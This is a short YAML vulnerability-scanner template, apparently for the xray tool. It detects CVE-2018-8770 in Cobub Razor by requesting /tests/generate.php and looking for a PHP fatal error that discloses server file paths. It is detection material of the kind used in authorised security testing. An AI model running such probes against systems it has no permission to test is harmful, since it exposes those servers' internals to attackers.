name: poc-yaml-razor-cve-2018-8770
binding: 630f83cd-d7c9-4ef6-9384-3cff45a09a74
manual: true
detail:
    author: we1x4n(https://we1x4n.github.io/)
    links:
        - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8770
        - https://www.exploit-db.com/exploits/44495/
    vulnerability:
        id: CT-40131
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /tests/generate.php
            follow_redirects: false
        expression: 'response.status == 200 && response.body.bcontains(b"Fatal error: Class ''PHPUnit_Framework_TestCase'' not found in ") && response.body.bcontains(b"/application/third_party/CIUnit/libraries/CIUnitTestCase.php on line")'
expression: r0()
